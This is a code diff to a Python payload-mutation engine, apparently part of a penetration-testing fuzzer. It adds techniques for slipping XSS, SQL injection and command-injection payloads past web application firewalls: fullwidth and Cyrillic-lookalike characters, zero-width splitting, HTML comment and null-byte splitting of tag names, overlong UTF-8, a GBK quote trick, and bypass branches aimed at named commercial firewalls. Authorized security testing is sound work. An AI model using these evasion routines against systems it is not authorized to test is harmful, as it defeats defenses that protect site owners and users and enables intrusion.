@@ -266,6 +266,110 @@ class MutationEngine:
 
         return results
 
+    def _unicode_bypass_mutations(self, payload: str) -> List[str]:
+        """Generate Unicode-based bypass mutations — fullwidth, confusables, combining chars."""
+        results = []
+
+        # Fullwidth Unicode replacement (< -> ＜, a -> ａ)
+        fw_map = {
+            "<": "\uff1c", ">": "\uff1e", "(": "\uff08", ")": "\uff09",
+            "'": "\uff07", '"': "\uff02", "/": "\uff0f", "=": "\uff1d",
+        }
+        fullwidth = ""
+        for c in payload:
+            if c in fw_map:
+                fullwidth += fw_map[c]
+            elif "a" <= c <= "z":
+                fullwidth += chr(ord(c) - ord("a") + 0xFF41)
+            elif "A" <= c <= "Z":
+                fullwidth += chr(ord(c) - ord("A") + 0xFF21)
+            else:
+                fullwidth += c
+        if fullwidth != payload:
+            results.append(fullwidth)
+
+        # Partial fullwidth — only special chars (some servers normalize alpha but not symbols)
+        partial_fw = ""
+        for c in payload:
+            if c in fw_map:
+                partial_fw += fw_map[c]
+            else:
+                partial_fw += c
+        if partial_fw != payload and partial_fw != fullwidth:
+            results.append(partial_fw)
+
+        # Unicode confusables (Cyrillic lookalikes)
+        confusables = {
+            "a": "\u0430", "c": "\u0441", "e": "\u0435", "o": "\u043e",
+            "p": "\u0440", "s": "\u0455", "i": "\u0456", "x": "\u0445",
+            "d": "\u0501", "h": "\u04bb", "n": "\u0578", "r": "\u0433",
+        }
+        confusable_variant = ""
+        for c in payload:
+            if c.lower() in confusables:
+                confusable_variant += confusables[c.lower()]
+            else:
+                confusable_variant += c
+        if confusable_variant != payload:
+            results.append(confusable_variant)
+
+        # Combining character insertion (zero-width chars between keyword letters)
+        # U+200B (zero-width space), U+200C (zero-width non-joiner), U+FEFF (BOM)
+        keywords = re.findall(r'[a-zA-Z]{4,}', payload)
+        for kw in keywords[:2]:
+            zwsp_variant = payload.replace(kw, "\u200b".join(kw), 1)
+            if zwsp_variant != payload:
+                results.append(zwsp_variant)
+            zwnj_variant = payload.replace(kw, "\u200c".join(kw), 1)
+            if zwnj_variant != payload:
+                results.append(zwnj_variant)
+
+        return results
+
+    def _chunked_html_mutations(self, payload: str) -> List[str]:
+        """HTML-specific chunking: comments, null bytes, newlines within tags."""
+        results = []
+
+        # HTML comment splitting: <script> -> <scr<!---->ipt>
+        html_tags = {
+            "script": "scr<!---->ipt",
+            "iframe": "ifr<!---->ame",
+            "object": "obj<!---->ect",
+            "onload": "onlo<!---->ad",
+            "onerror": "oner<!---->ror",
+            "onfocus": "onfo<!---->cus",
+        }
+        for tag, replacement in html_tags.items():
+            if tag.lower() in payload.lower():
+                variant = re.sub(re.escape(tag), replacement, payload, flags=re.IGNORECASE, count=1)
+                if variant != payload:
+                    results.append(variant)
+
+        # Null byte within tag names: <scr%00ipt>
+        for tag in ["script", "iframe", "object", "embed", "onload", "onerror"]:
+            if tag.lower() in payload.lower():
+                mid = len(tag) // 2
+                null_tag = tag[:mid] + "%00" + tag[mid:]
+                variant = re.sub(re.escape(tag), null_tag, payload, flags=re.IGNORECASE, count=1)
+                if variant != payload:
+                    results.append(variant)
+
+        # Newline within tag: <scr\nipt> bypasses single-line regex
+        for tag in ["script", "iframe", "onload", "onerror"]:
+            if tag.lower() in payload.lower():
+                mid = len(tag) // 2
+                nl_tag = tag[:mid] + "\n" + tag[mid:]
+                variant = re.sub(re.escape(tag), nl_tag, payload, flags=re.IGNORECASE, count=1)
+                if variant != payload:
+                    results.append(variant)
+                # Also URL-encoded newline
+                nl_url_tag = tag[:mid] + "%0a" + tag[mid:]
+                variant2 = re.sub(re.escape(tag), nl_url_tag, payload, flags=re.IGNORECASE, count=1)
+                if variant2 != payload:
+                    results.append(variant2)
+
+        return results
+
     def _splitting_mutations(self, payload: str) -> List[str]:
         """Generate keyword-splitting mutations."""
         results = []
@@ -655,25 +759,66 @@ class MutationEngine:
             for kw in re.findall(r'[a-zA-Z]{4,}', payload)[:3]:
                 mid = len(kw) // 2
                 results.append(payload.replace(kw, f"{kw[:mid]}/*imperva*/{kw[mid:]}", 1))
+            # Imperva is weak against HTML comment chunking for XSS
+            results.extend(self._chunked_html_mutations(payload)[:2])
 
         elif "f5" in waf or "big-ip" in waf or "bigip" in waf:
             # F5 BIG-IP bypasses
             results.append(payload.replace(" ", "%00"))
             results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
             results.append(payload.replace(" ", "/*!f5*/"))
+            # F5 often misses overlong UTF-8
+            overlong_map = {"<": "%C0%BC", ">": "%C0%BE", "'": "%C0%A7", '"': "%C0%A2"}
+            overlong = payload
+            for char, replacement in overlong_map.items():
+                overlong = overlong.replace(char, replacement)
+            if overlong != payload:
+                results.append(overlong)
+
+        elif "sucuri" in waf:
+            # Sucuri bypasses — generally weaker, double encoding often works
+            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
+            # Unicode confusables
+            results.extend(self._unicode_bypass_mutations(payload)[:2])
+            # HTML comment chunking
+            results.extend(self._chunked_html_mutations(payload)[:2])
+            # Case randomization
+            results.extend(self._case_mutations(payload)[:2])
+
+        elif "barracuda" in waf:
+            # Barracuda bypasses
+            results.append(payload.replace(" ", "%00"))
+            results.append(payload.replace(" ", "%0b"))  # Vertical tab
+            # Null byte tag splitting
+            for kw in re.findall(r'[a-zA-Z]{5,}', payload)[:2]:
+                mid = len(kw) // 2
+                results.append(payload.replace(kw, kw[:mid] + "%00" + kw[mid:], 1))
+            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
+
+        elif "fortiweb" in waf or "fortinet" in waf:
+            # FortiWeb bypasses
+            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
+            results.append(payload.replace(" ", "%09"))
+            # Unicode fullwidth
+            results.extend(self._unicode_bypass_mutations(payload)[:2])
+            results.extend(self._case_mutations(payload)[:2])
+
+        elif "wallarm" in waf:
+            # Wallarm bypasses — ML-based, needs more creative evasion
+            results.extend(self._unicode_bypass_mutations(payload)[:3])
+            results.extend(self._chunked_html_mutations(payload)[:2])
+            results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
 
         else:
-            # Generic WAF bypasses
+            # Generic WAF bypasses — apply the most universal techniques
             results.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
             results.append(payload.replace(" ", "%00"))
             results.append(payload.replace(" ", "%09"))
-            # Content-type confusion
-            results.append(payload)
-            # Null byte insertion
+            # Null byte insertion in keywords
             for kw in re.findall(r'[a-zA-Z]{4,}', payload)[:2]:
                 mid = len(kw) // 2
                 results.append(payload.replace(kw, f"{kw[:mid]}%00{kw[mid:]}", 1))
-            # Mixed encoding
+            # Mixed encoding (selective URL-encoding of special chars)
             mixed = ""
             for i, c in enumerate(payload):
                 if i % 3 == 0 and c in "<>'\"/()=":
@@ -682,6 +827,14 @@ class MutationEngine:
                     mixed += c
             if mixed != payload:
                 results.append(mixed)
+            # Unicode bypasses (fullwidth + confusables)
+            results.extend(self._unicode_bypass_mutations(payload)[:2])
+            # HTML chunking for XSS-like payloads
+            if "<" in payload:
+                results.extend(self._chunked_html_mutations(payload)[:2])
+            # GBK encoding for quote bypass
+            if "'" in payload:
+                results.append(payload.replace("'", "%bf%27"))
 
         return results
 
@@ -715,11 +868,13 @@ class MutationEngine:
             all_variants.update(self._encoding_mutations(payload))
             all_variants.update(self._whitespace_mutations(payload))
             all_variants.update(self._splitting_mutations(payload))
+            all_variants.update(self._unicode_bypass_mutations(payload))
 
             # Context-specific mutations
             ctx = context.lower().strip()
             if ctx in ("xss", "cross-site scripting"):
                 all_variants.update(self._xss_context_mutations(payload))
+                all_variants.update(self._chunked_html_mutations(payload))
             elif ctx in ("sqli", "sql", "sql injection"):
                 all_variants.update(self._sqli_context_mutations(payload))
             elif ctx in ("cmd", "command", "rce", "command injection", "os command"):
@@ -732,6 +887,7 @@ class MutationEngine:
                 all_variants.update(self._sqli_context_mutations(payload))
                 all_variants.update(self._cmd_context_mutations(payload))
                 all_variants.update(self._path_traversal_mutations(payload))
+                all_variants.update(self._chunked_html_mutations(payload))
 
             # WAF-specific bypasses (prioritized)
             waf_variants = []
